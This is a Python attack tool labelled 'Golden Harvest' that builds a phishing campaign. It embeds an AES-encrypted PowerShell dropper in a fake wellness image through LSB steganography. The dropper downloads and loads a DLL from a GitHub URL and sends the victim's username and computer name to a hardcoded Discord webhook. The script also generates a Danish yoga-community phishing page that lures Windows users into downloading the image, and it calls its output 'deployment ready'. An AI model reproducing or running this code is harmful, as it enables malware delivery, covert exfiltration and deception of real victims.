#!/usr/bin/env python3
"""
Steganography PowerShell Dropper with DLL Sideloading
Operation: Golden Harvest - Advanced Evasion Module
"""

import os
import base64
from PIL import Image
import numpy as np
import requests
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import hashlib

class StegoDrop:
    def __init__(self):
        self.webhook_url = "https://discord.com/api/webhooks/1285243636399796285/dBG84iTwDcJJWXw5JD4d-DJhfnzVA5d5oKUQkqMhqRx4s6KEcE2xfSGHBKs4HYN1B7aN"
        
        # PowerShell DLL sideloading payload with evasion
        self.powershell_payload = '''
$ErrorActionPreference = "SilentlyContinue"
Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class W { [DllImport("kernel32")] public static extern IntPtr GetModuleHandle(string n); [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n); [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o); }'

# Download and execute DLL sideloading
$url = "https://github.com/Jeki1234121/hollistisk-v2/raw/main/msvcr120.dll"
$path = "$env:TEMP\\msvcr120.dll"
try {
    (New-Object Net.WebClient).DownloadFile($url, $path)
    [Reflection.Assembly]::LoadFile($path)
    $beacon = @{ user = $env:USERNAME; computer = $env:COMPUTERNAME; time = Get-Date }
    Invoke-RestMethod -Uri "''' + self.webhook_url + '''" -Method Post -Body ($beacon | ConvertTo-Json) -ContentType "application/json"
    Remove-Item $path -Force
} catch {}
'''

    def encrypt_payload(self, payload):
        """AES encrypt the payload"""
        key = hashlib.sha256(b"GoldenHarvestKey2024").digest()[:16]
        cipher = AES.new(key, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(payload.encode())
        return base64.b64encode(cipher.nonce + tag + ciphertext).decode()

    def embed_in_image(self, image_path, encrypted_payload):
        """Hide encrypted PowerShell in image LSB"""
        img = Image.open(image_path)
        img_array = np.array(img)
        
        # Convert payload to binary
        payload_bin = ''.join(format(ord(c), '08b') for c in encrypted_payload)
        payload_bin += '1111111111111110'  # End marker
        
        flat_img = img_array.flatten()
        
        # Embed in LSB
        for i, bit in enumerate(payload_bin):
            if i < len(flat_img):
                flat_img[i] = (flat_img[i] & 0xFE) | int(bit)
        
        # Reshape and save
        stego_img = flat_img.reshape(img_array.shape)
        stego_image = Image.fromarray(stego_img.astype('uint8'))
        return stego_image

    def create_wellness_image(self):
        """Create innocent wellness/yoga image"""
        img = Image.new('RGB', (800, 600), color=(245, 245, 220))
        
        # Add some simple graphics to make it look legitimate
        pixels = img.load()
        for i in range(800):
            for j in range(600):
                # Create gradient effect
                r = int(245 - (i * 20 / 800))
                g = int(245 - (j * 30 / 600))  
                b = 220
                pixels[i, j] = (max(0, r), max(0, g), b)
        
        return img

    def generate_stego_image(self, output_path):
        """Generate steganographic image with embedded payload"""
        # Create base image
        wellness_img = self.create_wellness_image()
        wellness_img.save("temp_wellness.png")
        
        # Encrypt payload
        encrypted_payload = self.encrypt_payload(self.powershell_payload)
        
        # Embed encrypted payload in image
        stego_img = self.embed_in_image("temp_wellness.png", encrypted_payload)
        stego_img.save(output_path)
        
        # Clean up
        os.remove("temp_wellness.png")
        
        print(f"✅ Steganographic image created: {output_path}")
        return encrypted_payload

    def create_html_with_stego(self):
        """Update HTML to use steganographic image"""
        html_content = '''<!DOCTYPE html>
<html lang="da">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Yoga og holistisk wellness - Telegram invitation</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
            max-width: 400px;
            width: 100%;
            overflow: hidden;
        }
        .header {
            background: #0088cc;
            color: white;
            padding: 20px;
            text-align: center;
        }
        .content {
            padding: 30px 20px;
            text-align: center;
        }
        .wellness-img {
            width: 100%;
            max-width: 300px;
            margin: 20px auto;
            border-radius: 8px;
            cursor: pointer;
        }
        .join-btn {
            background: #0088cc;
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 25px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 20px;
            width: 100%;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🧘‍♀️ Yoga og holistisk wellness</h1>
            <p>Du er inviteret til vores eksklusive Telegram community</p>
        </div>
        <div class="content">
            <p>Velkommen til Danmarks førende wellness community med over 1.200 medlemmer!</p>
            
            <!-- Steganographic wellness image -->
            <img src="wellness_community.png" alt="Wellness Community" class="wellness-img" onclick="activateWellness()">
            
            <p><strong>200+ medlemmer online nu</strong></p>
            <p>Klik på billedet for at aktivere din wellness-oplevelse og få adgang til:</p>
            <ul style="text-align: left;">
                <li>Daily meditation guides</li>
                <li>Organic supplement tips</li>
                <li>Holistic health coaching</li>
                <li>Premium wellness content</li>
            </ul>
            
            <button class="join-btn" onclick="joinGroup()">🔗 Join Telegram Group</button>
        </div>
    </div>

    <script>
        function activateWellness() {
            // Social engineering - "activate wellness experience"
            if (navigator.userAgent.includes('Windows')) {
                // Trigger steganographic payload extraction (requires user to download image)
                var link = document.createElement('a');
                link.href = 'wellness_community.png';
                link.download = 'wellness_guide.png';
                link.click();
                
                setTimeout(() => {
                    alert('🧘‍♀️ Wellness guide downloaded! Åbn billedet for at aktivere din personlige meditation guide.');
                }, 1000);
            }
        }
        
        function joinGroup() {
            // Redirect to Telegram
            window.open('https://t.me/+YxJbAUDzpzEAAQAAAG82W3tzhTzY', '_blank');
        }
    </script>
</body>
</html>'''
        
        with open('wellness-invitation.html', 'w', encoding='utf-8') as f:
            f.write(html_content)
            
        print("✅ Steganographic HTML page created: wellness-invitation.html")

if __name__ == "__main__":
    print("🎯 GOLDEN HARVEST - Steganographic Dropper Generator")
    print("=" * 60)
    
    stego = StegoDrop()
    
    # Generate steganographic image with embedded PowerShell
    encrypted_key = stego.generate_stego_image("wellness_community.png")
    
    # Create HTML page with steganographic trigger
    stego.create_html_with_stego()
    
    print("\n🎯 DEPLOYMENT READY:")
    print("• wellness-invitation.html - Clean phishing page")  
    print("• wellness_community.png - Steganographic PowerShell dropper")
    print("• Payload extracts and runs PowerShell on Windows systems")
    print("• DLL sideloading with msvcr120.dll bypass")
    print("• Auto-deletion after execution for cleanup")